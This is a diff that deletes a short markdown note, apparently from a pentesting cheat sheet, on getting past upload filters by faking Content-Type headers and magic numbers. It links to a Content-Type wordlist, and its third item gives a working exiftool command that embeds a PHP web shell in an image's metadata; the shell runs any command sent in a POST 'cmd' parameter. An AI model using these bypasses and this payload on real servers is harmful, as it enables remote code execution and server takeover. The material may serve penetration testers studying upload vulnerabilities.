@@ -1,6 +1,0 @@
-#Bypass Content-Type & magic number
-
-1. Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain , application/octet-stream
-2. Content-Type wordlist: https://github.com/Jenderal92/shin/raw/main/content-type.txt
-3. Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata: exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
-4. It is also possible that the magic bytes are just being checked in the file and you could set them anywhere in the file.
